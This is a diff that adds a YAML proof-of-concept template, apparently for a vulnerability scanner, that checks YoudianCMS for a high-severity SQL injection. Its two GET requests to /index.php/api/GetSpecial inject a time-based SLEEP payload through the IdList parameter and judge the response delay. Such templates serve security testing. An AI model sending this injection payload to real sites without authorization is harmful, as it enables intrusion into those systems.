@@ -1,0 +1,44 @@
+id: poc-yaml-youdiancms-getspecial-sqli
+info:
+  name: 友点CMS GetSpecial SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: youdiancms
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1)+and+(SELECT+*+FROM+(SELECT(SLEEP({{.t1}})))A
+  expression: 'status_code == 200 &&
+
+    duration >= t1 &&
+
+    duration <= t2 &&
+
+    contains(find_json(body,"Data"), "false") &&
+
+    contains(find_json(body,"Debug.ApiExecTime"), "s") &&
+
+    contains(find_json(body,"Debug.ApiUseMemory"), "M")
+
+    '
+- method: GET
+  path: /index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1)+and+(SELECT+*+FROM+(SELECT(SLEEP({{.t3}})))A
+  expression: 'status_code == 200 &&
+
+    duration >= t3 &&
+
+    duration <= t4 &&
+
+    contains(find_json(body,"Data"), "false") &&
+
+    contains(find_json(body,"Debug.ApiExecTime"), "s") &&
+
+    contains(find_json(body,"Debug.ApiUseMemory"), "M")
+
+    '
+transport: http
